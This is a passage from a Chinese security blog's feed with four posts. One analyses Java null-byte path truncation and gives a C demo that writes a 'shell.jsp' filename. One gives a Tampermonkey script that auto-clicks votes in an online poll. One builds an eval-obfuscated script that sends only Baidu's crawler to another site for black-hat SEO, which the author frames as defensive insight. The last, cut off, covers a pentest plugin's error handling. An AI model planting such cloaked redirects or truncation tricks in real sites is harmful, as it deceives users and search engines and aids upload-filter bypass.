NT系统合法路径。然而通过阅读该方法源码，发现它并没有对\00字符串进行过滤。如果在其他Window操作系统版本下，则直接使用原始文件路径。</p><p>按照<code>winFileHandleOpen</code>方法的逻辑，无论如何最终都是调用了<code>CreateFileW</code>这个Windows API函数来创建文件。由于这个过程中均未对<code>\00</code>字符串进行过滤，如果传入的文件路径带有\00字符，则<code>CreateFileW</code>函数在创建文件时，路径会被截断。这没什么好说的。</p><p>这里我们没法继续跟进CreateFileW函数，毕竟Windows不开源。为了文章的严谨性，这里我用C语言写一个demo，来证明该函数可以截断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE fileHandle = CreateFileW(<span class="string">L"C:\\shell.jsp\0test.txt"</span>, GENERIC_WRITE, FILE_SHARE_WRITE, <span class="number">0</span>, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> *data = <span class="string">"Test by c0ny1"</span>;</span><br><span class="line">DWORD a = <span class="built_in">strlen</span>(data);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> b;</span><br><span class="line">WriteFile(fileHandle, data, a, &amp;b, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(fileHandle);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码运行演示如下：</p><p><img src="/articles/2019/java-00-truncation-detail/show.gif" alt="CreateFileW函数00截断演示"></p><h2 id="三、漏洞是如何修复的？"><a href="#三、漏洞是如何修复的？" class="headerlink" title="三、漏洞是如何修复的？"></a>三、漏洞是如何修复的？</h2><p>这里选择使用<code>jdk1.7.0_80</code>（JDK1.7最新版本），来观察漏洞如果被修复的。</p><p>我们继续按照原来漏洞触发的调用链重新跟踪一遍，跟踪到第二构造函数时，发现多了一个针对文件路径的检查，若检查结果为非法，则抛出异常<code>Invalid file path</code>.</p><p><img src="/articles/2019/java-00-truncation-detail/fix-01.png" alt="构造函数中检查文件路径"></p><p>继续跟进，来到<code>java.io.File</code>类的<code>isInvalid</code>方法,发现该检查函数判断了路径中是否包含00字符串。（注意：java默认编码为Unicode，00字符串的Unicode编码为\u0000）。</p><p><img src="/articles/2019/java-00-truncation-detail/fix-02.png" alt="文件路径检查函数"></p><h2 id="四、漏洞影响的版本范围"><a href="#四、漏洞影响的版本范围" class="headerlink" title="四、漏洞影响的版本范围"></a>四、漏洞影响的版本范围</h2><p>我们知道jdk1.7版本是部分版本存在漏洞的。但这里我们需要确定是哪个版本修复了这个漏洞。翻阅了JDK1.7多个版本代码，发现在JDK1.7.0_40（7u40）开始加上了对文件名是否存在\00字符的检查。也就是说 <strong>JDK1.7.0_40之前java是存在00截断的，而之后的版本就不存在了！</strong></p><p>后面在官网的JDK 7u40的更新日志中也找到了关于00截断问题Bug ID，分别为<code>JDK-8003992</code>和<code>JDK-8011539</code>，具体链接放在了文末的参考文章里了。其实这两个是同一个Bug，官网也说明了它们重复了。</p><p><img src="/articles/2019/java-00-truncation-detail/update_note.png" alt="oracle官方更新日志"></p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><ul><li><a href="https://blog.csdn.net/I_S_T_O/article/details/1843871" target="_blank" rel="noopener">JAVA /00文件路径截断漏洞与分析for windows并对.NET比较</a></li><li><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8003992" target="_blank" rel="noopener">JDK-8003992 : File and other classes in java.io do not handle embedded nulls properly</a></li><li><a href="https://bugs.java.com/bugdatabase/view_bug.do?bug_id=8011539" target="_blank" rel="noopener">JDK-8011539 : File APIs Should Not Allow Null Bytes</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;4个月前写了一篇文章叫&lt;a href=&quot;http://gv7.me/articles/2018/java-00-truncation/&quot;&gt;《从代码层面理解java的00截断漏洞》&lt;/a&gt;，由于当时出差新疆没时间深入，便在文末立了个有空继续深入的flag。今天我们通过跟踪jd
      
    
    </summary>
    
      <category term="漏洞原理" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    
    
      <category term="00截断" scheme="http://gv7.me/tags/00%E6%88%AA%E6%96%AD/"/>
    
  </entry>
  
  <entry>
    <title>小玩具01:编写WSIS自动投票油猴脚本</title>
    <link href="http://gv7.me/articles/2019/tampermonkey-script-autoclicker/"/>
    <id>http://gv7.me/articles/2019/tampermonkey-script-autoclicker/</id>
    <published>2019-01-11T19:31:11.000Z</published>
    <updated>2019-02-16T18:03:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>这是1月9号的事了，kang哥在群里发了一个消息，说是需要大家帮忙WSIS奖投票。让每位同事都投一遍。我看了下投票步骤说明文档，其实挺麻烦的。最主要的是足足有18项，需要一个个的点击才能完成。旁边的JackyTsuuuy大佬慢悠悠的蠕动着他性感的小胡须，说道可以尝试使用js自动点击完成这18项选择，还提供了最朴素的几行代码。在他几次怂恿下决定实现这一想法。</p><a id="more"></a><h2 id="一、需求"><a href="#一、需求" class="headerlink" title="一、需求"></a>一、需求</h2><p>当时发的投票步骤说明文档具体需求如下：</p><p>投票页面有18个Category，每完成一个Category的投票就会自动进行下一个Category页面，需要完成所有18个Category的投票。注意：重点在<code>Category5-AL C5</code>选择 <strong>Artificial Intelligence (AI) based spam messages and calls prevention solution</strong> ，其他Category可以任意选。</p><h2 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h2><p>判断页面是否有内容为“Artificial Intelligence (AI) based spam messages and calls prevention solution”选项的按钮，如果有就点击，没有就随机选择一个选项。然后进入下一页，等待页面加载完成继续重复上面的操作。其实思路很简单，代码实现也不难，但是细节问题却耐人寻味，想给大家分享下。</p><h2 id="三、实现"><a href="#三、实现" class="headerlink" title="三、实现"></a>三、实现</h2><p>通过前端分析，发现内容为“Artificial Intelligence (AI) based spam messages and calls prevention solution”选项对应着是一个标签名为<code>button</code>，属性<code>value</code>的值为<code>15434938390848023</code>的按钮。</p><p><img src="/articles/2019/tampermonkey-script-autoclicker/positioning-elements.png" alt="分析要点击的页面元素"></p><p>注意：定位选择的属性名和属性值在当前页面是唯一的，这样才能保证点击正确。</p><p>实现定位目标选项的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*定位要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line"><span class="keyword">return</span> target[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> target = getTargetByTAV(<span class="string">"button"</span>,<span class="string">"value"</span>,<span class="string">"15434938390848023"</span>);</span><br></pre></td></tr></table></figure><p>当页面没有内容为<code>Artificial...solution</code>对应的选项时，就随机选择一项点击。分析页面发现每个选项对应的按钮元素都有<code>name=&quot;voteProjectId&quot;</code>,我们以此来定位它们。实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// code refence: https://www.cnblogs.com/phpyangbo/p/6129868.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomNum</span>(<span class="params">Min, Max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Range = Max - Min;</span><br><span class="line">    <span class="keyword">var</span> Rand = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> num = Min + <span class="built_in">Math</span>.floor(Rand * Range);  <span class="comment">//舍去</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByRandom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByName(<span class="string">"voteProjectId"</span>);</span><br><span class="line"><span class="keyword">var</span> n = RandomNum(<span class="number">0</span>,target.length);</span><br><span class="line"><span class="keyword">return</span> target[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后呢，为了保证点击成功，我们设置每间隔<code>100ms</code>就重复点击一次。实现代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (button) &#123;</span><br><span class="line">        button.click();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>将以上代码放到浏览器开发者工具的console中执行是可以的，但是会存在一个问题。那就是页面刷新后，我们编写的代码将不会作用于新的页面。为了解决这个问题，当然可以编写一个浏览器插件来解决，但是油猴已经做好了这个工作。我们只需要站在巨人的肩膀上，完成我们的想法即可。</p><p>按照油猴的脚本编写规则，最终源码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         wsis-auto-vote</span></span><br><span class="line"><span class="comment">// @namespace    http://gv7.me</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  wsis 自动投票，自动投"Artificial Intelligence (AI) based spam messages and calls prevention solution"选项。</span></span><br><span class="line"><span class="comment">// @author       c0ny1</span></span><br><span class="line"><span class="comment">// @match        https://www.itu.int/*</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*定位要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line"><span class="keyword">return</span> target[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// code refence: https://www.cnblogs.com/phpyangbo/p/6129868.html</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RandomNum</span>(<span class="params">Min, Max</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> Range = Max - Min;</span><br><span class="line">    <span class="keyword">var</span> Rand = <span class="built_in">Math</span>.random();</span><br><span class="line">    <span class="keyword">var</span> num = Min + <span class="built_in">Math</span>.floor(Rand * Range);  <span class="comment">//舍去</span></span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*随机获取一个要点击的页面元素*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTargetByRandom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByName(<span class="string">"voteProjectId"</span>);</span><br><span class="line"><span class="keyword">var</span> n = RandomNum(<span class="number">0</span>,target.length);</span><br><span class="line"><span class="keyword">return</span> target[n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn;</span><br><span class="line">btn = getTargetByTAV(<span class="string">"button"</span>,<span class="string">"value"</span>,<span class="string">"15434938390848023"</span>);</span><br><span class="line"><span class="keyword">if</span>(btn === <span class="literal">undefined</span>)&#123;</span><br><span class="line">    btn = getTargetByRandom();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (btn !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[+] click obj: "</span> + btn.innerHTML);</span><br><span class="line">        btn.click();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'[-] click obj is undefined!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/tampermonkey-script-autoclicker/show.gif" alt="最终效果"></p><h2 id="五、延伸"><a href="#五、延伸" class="headerlink" title="五、延伸"></a>五、延伸</h2><p>刚才是一个具体场景下的代码实现。但是我思考了下，其实我们生活中还有很多场景，可以通过快速重复点击页面元素来解决。比如春节的刷票，大学的抢课，双11的抢购等等。也许有人有疑问，使用burp多次重放数据包不就可以了么？其实这样不一定行，因为请求可能需要提交token或者其他需要浏览器执行js获取到的数据。</p><p>于是我改基于以上代码，编写了一个适合更多场景下快速重复点击页面元素的油猴脚本。该脚本已经在油猴的在线脚本库Greasy Fork发布了，想看最新源码或者使用的朋友<a href="https://greasyfork.org/zh-CN/scripts/376507-autoclicker" target="_blank" rel="noopener">请点击这里</a>。</p><p>该脚本提供了通过以下几种方式获取需要点击的页面元素：</p><table><thead><tr><th align="center">序号</th><th align="left">定位方式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">id</td><td align="left">提供页面要点击元素的id，赋值给id变量即可</td></tr><tr><td align="center">2</td><td align="left">标签名，属性，属性值</td><td align="left">提供页面要点击元素的标签名，属性，属性值分别给tag，attr，value即可</td></tr><tr><td align="center">3</td><td align="left">xpath</td><td align="left">提供页面要点击元素的xpath，赋值给str_xpath变量即可</td></tr><tr><td align="center">4</td><td align="left">selector</td><td align="left">提供页面要点击元素的selector，赋值给str_qs变量即可</td></tr><tr><td align="center">5</td><td align="left">自定义定位函数</td><td align="left">以上方式无法定位到目标元素，可以将isCustom变量赋值为true，同时编写getTargetByCustom函数的函数体，返回定位成功的元素即可</td></tr></tbody></table><p>具体使用方法请移步<a href="https://greasyfork.org/zh-CN/scripts/376507-autoclicker" target="_blank" rel="noopener">Greasy Fork</a>。</p><h2 id="六、最后"><a href="#六、最后" class="headerlink" title="六、最后"></a>六、最后</h2><p>最后给大家留一个思考： <strong>该如何权衡我们脚本点击提交的速度和成功率？</strong></p><ol><li>如果我们的脚本点击按钮过快，可能表单某些必要的值（比如token，需要每次发送ajax请求来更新）还没有被加载。从而导致提交失败。</li><li>如果等待所有资源都加载完成，然后脚本在进行点击操作，这样又太慢展现不了脚本的优势（比如抢购场景下）。</li></ol><p>考虑这些特殊情况，会让我们的脚本更加壮硕，欢迎留言讨论。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是1月9号的事了，kang哥在群里发了一个消息，说是需要大家帮忙WSIS奖投票。让每位同事都投一遍。我看了下投票步骤说明文档，其实挺麻烦的。最主要的是足足有18项，需要一个个的点击才能完成。旁边的JackyTsuuuy大佬慢悠悠的蠕动着他性感的小胡须，说道可以尝试使用js自动点击完成这18项选择，还提供了最朴素的几行代码。在他几次怂恿下决定实现这一想法。&lt;/p&gt;
    
    </summary>
    
      <category term="小玩具" scheme="http://gv7.me/categories/%E5%B0%8F%E7%8E%A9%E5%85%B7/"/>
    
    
      <category term="油猴脚本" scheme="http://gv7.me/tags/%E6%B2%B9%E7%8C%B4%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>一个有趣的暗链</title>
    <link href="http://gv7.me/articles/2019/an-interesting-dark-chain/"/>
    <id>http://gv7.me/articles/2019/an-interesting-dark-chain/</id>
    <published>2019-01-08T13:35:50.000Z</published>
    <updated>2019-02-16T18:07:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>今天吃完午饭，无意听到同事说起了以前查网站暗链的事。他说有一种暗链其实隐藏得挺深的，正常去访问是不会触发，而当百度等搜索引擎的爬虫去爬取该页面时，就会进行跳转。从而将爬虫引入到黑客指定的站点，来提升指定站点的排名。</p><p>思考了下，感觉比那些直接简单粗暴直接跳转要妙多了。饭后去网上找了下，没有找到相关代码。打算自己写一个（可能真实的案例不是这么写的）。</p><h2 id="一、代码实现"><a href="#一、代码实现" class="headerlink" title="一、代码实现"></a>一、代码实现</h2><p>下面我们尝试从黑帽SEO的角度来思考问题和编写代码。我实现的方式是通过js判断ua，来识别是否是百度爬虫，从而决定是否跳转。代码很简单，具体如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> keyword = <span class="string">"baidu"</span>; <span class="comment">//关键字</span></span><br><span class="line"><span class="keyword">var</span> my_site = <span class="string">"http://gv7.me"</span>; <span class="comment">//要跳转到的网站</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ua = navigator.userAgent;</span><br><span class="line"><span class="keyword">if</span>(ua.toLowerCase().indexOf(keyword) &gt;= <span class="number">0</span>)&#123; <span class="comment">//判断ua是否是百度爬虫</span></span><br><span class="line"><span class="built_in">window</span>.location.href=my_site;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>为了加强隐僻性，我们对以上代码进行混淆和压缩。</p><p><img src="/articles/2019/an-interesting-dark-chain/obfuscating-compressed-js-code.png" alt></p><p>最终测试页面代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">title</span>&gt;</span>test for hack seo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>test for hack seo!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">eval</span>(<span class="function"><span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)</span>&#123;e=<span class="function"><span class="keyword">function</span>(<span class="params">c</span>)</span>&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">""</span>:e(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="built_in">String</span>.fromCharCode(c+<span class="number">29</span>):c.toString(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">''</span>.replace(<span class="regexp">/^/</span>,<span class="built_in">String</span>))&#123;<span class="keyword">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">'\\w+'</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'\\b'</span>+e(c)+<span class="string">'\\b'</span>,<span class="string">'g'</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">'5.8=6()&#123;1 2="9";1 4="a://b.7";1 3=c.h;g(3.i().d(2)&gt;=0)&#123;5.e.f=4&#125;&#125;'</span>,<span class="number">19</span>,<span class="number">19</span>,<span class="string">'|var|keyword|ua|my_site|window|function|me|onload|baidu|http|gv7|navigator|indexOf|location|href|if|userAgent|toLowerCase'</span>.split(<span class="string">'|'</span>),<span class="number">0</span>,&#123;&#125;))</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="二、演示效果"><a href="#二、演示效果" class="headerlink" title="二、演示效果"></a>二、演示效果</h2><p>演示前，我们先为chrome浏览器添加一个百度爬虫的UA,以便模拟百度爬虫流量网页。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/an-interesting-dark-chain/chrome-setting.png" alt="为chrome浏览器添加一个百度爬虫的UA。"></p><p><strong>注意：使用burp或者chrome插件<code>User-Agent Switcher Options</code>修改的UA是无效的，因为它们只是修改了浏览器发送的数据包中的UA，而没有修改浏览器真正的UA。</strong></p><p>通过测试发现，在使用默认ua访问时，页面没有跳转。切换UA后成功跳转到我的博客。</p><p><img src="/articles/2019/an-interesting-dark-chain/show.gif" alt="效果展示"></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>写这篇文章并非鼓励大家去挂暗链，而是从攻防的角度，了解一些挂暗链的思路。使得在对抗黑帽SEO时能多些思路。比如就可以将浏览器UA修改为百度等搜索引擎爬虫的UA，尝试找出隐藏的暗链。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://blog.csdn.net/wangweiscsdn/article/details/73182320" target="_blank" rel="noopener">用js如何获取UA（user Agent）用户代理？</a></li><li><a href="https://blog.csdn.net/dengpeng0419/article/details/53591525" target="_blank" rel="noopener">【web开发 模拟ua调试】修改chrome浏览器的user agent</a></li><li><a href="https://muzi.kim/post/65.html" target="_blank" rel="noopener">对比中招网页暗链挂马，总结10种有趣的暗链代码并解析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天吃完午饭，无意听到同事说起了以前查网站暗链的事。他说有一种暗链其实隐藏得挺深的，正常去访问是不会触发，而当百度等搜索引擎的爬虫去爬取该页面时，就会进行跳转。从而将爬虫引入到黑客指定的站点，来提升指定站点的排名。&lt;/p&gt;
&lt;p&gt;思考了下，感觉比那些直接简单粗暴直接跳转要妙
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>解决jsEncrypter脚本错误代码不报错问题</title>
    <link href="http://gv7.me/articles/2018/solve-jsEncrypter-script-error-code-is-not-wrong/"/>
    <id>http://gv7.me/articles/2018/solve-jsEncrypter-script-error-code-is-not-wrong/</id>
    <published>2018-11-08T19:33:27.000Z</published>
    <updated>2019-02-16T18:04:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;用过我的<a href="https://github.com/c0ny1/jsEncrypter" target="_blank" rel="noopener">jsEncrypter</a>插件的朋友，可能会有一个遇到一个大坑： <strong>当编写前端加密调用脚本代码存在错误时，phantomJS不会报错，而且会进入假死，不能继续执行的状态。</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;如果前端的加密逻辑比较简单还好，当前端加密涉及多个js文件，逻辑比较复杂时，编写调用代码存在错误在所难免。这时如果phantomJS运行该脚本不报错提示就特别难受了，修改bug将变得很苦逼。这个问题在很久之前我已经能隐约感觉到了，而上周这个坑大大影响到了我的渗透测试，不得已只能百忙之中挤点时间来填坑。</p><h2 id="0x01-解决方案一：编码调式"><a href="#0x01-解决方案一：编码调式" class="headerlink" title="0x01 解决方案一：编码调式"></a>0x01 解决方案一：编码调式</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;在上周的渗透测试中，我遇到了一个前端加密传输的登录表单，涉及3个js文件，逻辑比较复杂。我编写前端加密调用脚本存在错误，phantomJS运行该脚本不报错不退出退出也不继续执行，我完全不知道出错在哪里。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;当时是通过<code>console.log()</code>函数进行调式的。一个值一个值的使用console.log()进行输出，在每个关键的判断语句内使用<code>console.log(&#39;run to here&#39;)</code>来确定逻辑走到哪里了。经过反复编码调式，最终锁定了错误位置和原因，原来是有一个值没有进行初始化。这个过程很费时间和精力orz！</p><h2 id="0x02-解决方案二：升级服务端脚本"><a href="#0x02-解决方案二：升级服务端脚本" class="headerlink" title="0x02 解决方案二：升级服务端脚本"></a>0x02 解决方案二：升级服务端脚本</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;今晚有点时间，思考了下编码调式虽然能解决问题，但升级服务端脚本，使其支持运行错误代码时能提示出错误信息以及涉及的代码行数才算治标治本。我在重新查看了<code>phantomJS</code>的官方文档后，给项目的<code>phantom_server.js</code>脚本添加了以下错误捕捉的代码，完整代码已经更新至github项目了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'\n-----------------Error Info--------------------'</span>)</span><br><span class="line"><span class="keyword">var</span> fullMessage = <span class="string">"Message: "</span>+e.toString() + <span class="string">':'</span>+ e.line;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> e) &#123;</span><br><span class="line">fullMessage += <span class="string">"\n"</span> + p.toUpperCase() + <span class="string">": "</span> + e[p];</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">console</span>.log(fullMessage);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'---------------------------------------------'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'[*] phantomJS exit!'</span>)</span><br><span 